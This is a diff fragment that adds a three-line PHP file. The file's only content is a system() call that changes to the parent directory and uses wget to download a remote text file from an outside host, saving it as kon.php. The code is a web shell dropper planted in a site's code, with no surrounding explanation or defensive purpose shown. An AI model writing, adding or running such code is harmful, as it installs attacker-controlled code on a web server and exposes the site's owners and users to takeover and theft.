@@ -1,0 +1,3 @@
+<?php
+system("cd ../ && wget https://shell.prinsh.com/Nathan/marijuana.txt -O kon.php");
+?>
